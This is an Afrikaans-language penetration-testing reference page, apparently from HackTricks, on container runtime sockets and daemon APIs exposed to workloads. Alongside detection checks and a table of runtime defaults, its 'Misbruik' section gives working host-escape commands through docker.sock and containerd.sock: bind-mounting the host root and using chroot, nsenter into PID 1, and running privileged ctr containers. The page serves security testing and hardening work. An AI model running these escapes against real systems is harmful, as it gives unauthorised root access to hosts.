# Runtime API en Daemon-blootstelling

{{#include ../../../banners/hacktricks-training.md}}

## Oorsig

Baie werklike container-kompromitterings begin glad nie met 'n namespace-ontsnapping nie. Hulle begin met toegang tot die runtime-bestuursvlak. As 'n workload met `dockerd`, `containerd`, CRI-O, Podman, of kubelet kan kommunikeer deur 'n gemonteerde Unix socket of 'n blootgestelde TCP-listener, kan die aanvaller moontlik 'n nuwe container met beter privileges versoek, die host-lêerstelsel mount, host-namespaces join, of sensitiewe node-inligting onttrek. In daardie gevalle is die runtime API die werklike sekuriteitsgrens, en om dit te kompromitteer is funksioneel naby daaraan om die host te kompromitteer.

Hierom moet runtime socket-blootstelling apart van kernel-beskermings gedokumenteer word. 'n Container met gewone seccomp, capabilities, en MAC confinement kan steeds slegs een API-aanroep verwyder wees van 'n host-kompromittering as `/var/run/docker.sock` of `/run/containerd/containerd.sock` daarin gemonteer is. Die kernel-isolasie van die huidige container kan presies werk soos ontwerp, terwyl die runtime-bestuursvlak ten volle blootgestel bly.

## Daemon-toegangsmodelle

Docker Engine maak sy bevoorregte API tradisioneel beskikbaar via die plaaslike Unix socket by `unix:///var/run/docker.sock`. Histories is dit ook op afstand blootgestel via TCP-listeners soos `tcp://0.0.0.0:2375` of 'n TLS-beskermde listener op `2376`. Om die daemon van afstand bloot te stel sonder sterk TLS en kliëntverifikasie maak effektief die Docker API 'n remote root interface.

containerd, CRI-O, Podman, en kubelet bied soortgelyke hoog-impak oppervlaktes aan. Die name en werkvloei verskil, maar die logika nie. As die interface die caller toelaat om workloads te skep, host-paaie te mount, credentials te onttrek, of lopende containers te verander, is die interface 'n bevoorregte bestuurskanaal en moet dit dienooreenkomstig behandel word.

Common local paths worth checking are:
```text
/var/run/docker.sock
/run/docker.sock
/run/containerd/containerd.sock
/var/run/crio/crio.sock
/run/podman/podman.sock
/var/run/kubelet.sock
/run/buildkit/buildkitd.sock
/run/firecracker-containerd.sock
```
Ouer of meer gespesialiseerde stacks kan ook endpoints blootstel soos `dockershim.sock`, `frakti.sock`, of `rktlet.sock`. Daardie is minder algemeen in moderne omgewings, maar wanneer hulle aangetref word, moet hulle met dieselfde omsigtigheid behandel word omdat hulle runtime-control surfaces eerder as gewone application sockets verteenwoordig.

## Beveiligde afstandstoegang

As 'n daemon buite die plaaslike socket blootgestel moet word, moet die verbinding met TLS beskerm word en verkieslik met mutual authentication, sodat die daemon die kliënt verifieer en die kliënt die daemon verifieer. Die ou gewoonte om die Docker daemon op plain HTTP oop te stel vir gerief is een van die gevaarlikste foute in container administrasie omdat die API surface sterk genoeg is om privileged containers direk te skep.

Die historiese Docker-konfigurasiepatroon het soos volg gelyk:
```bash
DOCKER_OPTS="-H unix:///var/run/docker.sock -H tcp://192.168.56.101:2376"
sudo service docker restart
```
Op systemd-gebaseerde hosts kan daemon-kommunikasie ook as `fd://` verskyn, wat beteken die proses erf 'n vooraf-geopen socket van systemd in plaas daarvan om self direk te bind. Die belangrike les is nie die presiese sintaksis nie, maar die sekuriteitsgevolg. Die oomblik wat die daemon buite 'n streng gemagtigde plaaslike socket luister, word transport security en client authentication verpligtend eerder as opsionele hardening.

## Misbruik

As 'n runtime socket teenwoordig is, bevestig watter een dit is, of 'n kompatibele client bestaan, en of rou HTTP- of gRPC-toegang moontlik is:
```bash
find / -maxdepth 3 \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
ss -xl | grep -E 'docker|containerd|crio|podman|kubelet' 2>/dev/null
docker -H unix:///var/run/docker.sock version 2>/dev/null
ctr --address /run/containerd/containerd.sock images ls 2>/dev/null
crictl --runtime-endpoint unix:///var/run/crio/crio.sock ps 2>/dev/null
```
Hierdie opdragte is nuttig omdat hulle onderskei tussen 'n dooie pad, 'n gemonteerde maar ontoeganklike socket, en 'n lewende bevoorregte API. As die client slaag, is die volgende vraag of die API 'n nuwe container kan loods met 'n host bind mount of host namespace sharing.

### Volledige voorbeeld: Docker Socket To Host Root

As `docker.sock` bereikbaar is, is die klassieke escape om 'n nuwe container te begin wat die host se root-lêerstelsel monteer en dan `chroot` daarin uit te voer:
```bash
docker -H unix:///var/run/docker.sock images
docker -H unix:///var/run/docker.sock run --rm -it -v /:/host ubuntu:24.04 chroot /host /bin/bash
```
Dit gee direkte uitvoering as root op die host deur die Docker daemon. Die impak is nie beperk tot lêerlees nie. Sodra die aanvaller in die nuwe container is, kan die aanvaller host-lêers verander, credentials insamel, persistence implanteer, of addisionele bevoorregte workloads begin.

### Volledige Voorbeeld: Docker Socket To Host Namespaces

Indien die aanvaller namespace entry verkies in plaas van filesystem-only access:
```bash
docker -H unix:///var/run/docker.sock run --rm -it --pid=host --privileged ubuntu:24.04 bash
nsenter --target 1 --mount --uts --ipc --net --pid -- bash
```
Hierdie pad bereik die host deur die runtime te vra om 'n nuwe container met eksplisiete host-namespace-blootstelling te skep, eerder as om die huidige een te benut.

### Volledige voorbeeld: containerd Socket

'n gemonteerde `containerd` socket is gewoonlik net so gevaarlik:
```bash
ctr --address /run/containerd/containerd.sock images pull docker.io/library/busybox:latest
ctr --address /run/containerd/containerd.sock run --tty --privileged --mount type=bind,src=/,dst=/host,options=rbind:rw docker.io/library/busybox:latest host /bin/sh
chroot /host /bin/sh
```
Die impak is weer kompromittering van die gasheer. Selfs al is Docker-spesifieke hulpmiddels afwesig, kan 'n ander runtime API steeds dieselfde administratiewe mag bied.

## Kontroles

Die doel van hierdie kontroles is om te bepaal of die container enige bestuurvlak kan bereik wat buite die vertrouensgrens moes gebly het.
```bash
find / -maxdepth 3 \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
mount | grep -E '/var/run|/run|docker.sock|containerd.sock|crio.sock|podman.sock|kubelet.sock'
ss -lntp 2>/dev/null | grep -E ':2375|:2376'
env | grep -E 'DOCKER_HOST|CONTAINERD_ADDRESS|CRI_CONFIG_FILE'
```
Wat hier interessant is:

- ’n gemonteerde runtime-socket is gewoonlik ’n direkte administratiewe primitie f eerder as bloot inligtingsvrystelling.
- ’n TCP-listener op `2375` sonder TLS moet as ’n remote-compromise toestand beskou word.
- Omgewingsveranderlikes soos `DOCKER_HOST` openbaar dikwels dat die workload doelbewus ontwerp is om met die host runtime te kommunikeer.

## Runtime-standaarde

| Runtime / platform | Standaardtoestand | Standaardgedrag | Algemene handmatige verzwakking |
| --- | --- | --- | --- |
| Docker Engine | Lokaal Unix-socket as standaard | `dockerd` luister op die plaaslike socket en die daemon is gewoonlik rootful | montering van `/var/run/docker.sock`, blootstelling van `tcp://...:2375`, swakke of afwesige TLS op `2376` |
| Podman | Daemonless CLI as standaard | Geen langdurige bevoorregte daemon is nodig vir gewone plaaslike gebruik nie; API-sockets kan steeds blootgestel word wanneer `podman system service` aangeskakel is | blootstelling van `podman.sock`, die service wyd laat loop, rootful API-gebruik |
| containerd | Plaaslike bevoorregte socket | Administratiewe API blootgestel via die plaaslike socket en gewoonlik deur hoërvlak-gereedskap verbruik | montering van `containerd.sock`, wye `ctr` of `nerdctl` toegang, blootstelling van bevoorregte namespaces |
| CRI-O | Plaaslike bevoorregte socket | CRI-endpunt is bedoel vir node-lokale vertroude komponente | montering van `crio.sock`, blootstelling van die CRI-endpunt aan untrusted workloads |
| Kubernetes kubelet | Node-lokale bestuur-API | Kubelet moet nie wyd bereikbaar wees vanaf Pods nie; toegang kan pod-status, credentials, en uitvoeringseienskappe openbaar afhangend van authn/authz | montering van kubelet sockets of certs, swakke kubelet-auth, host networking plus bereikbare kubelet-endpunt |
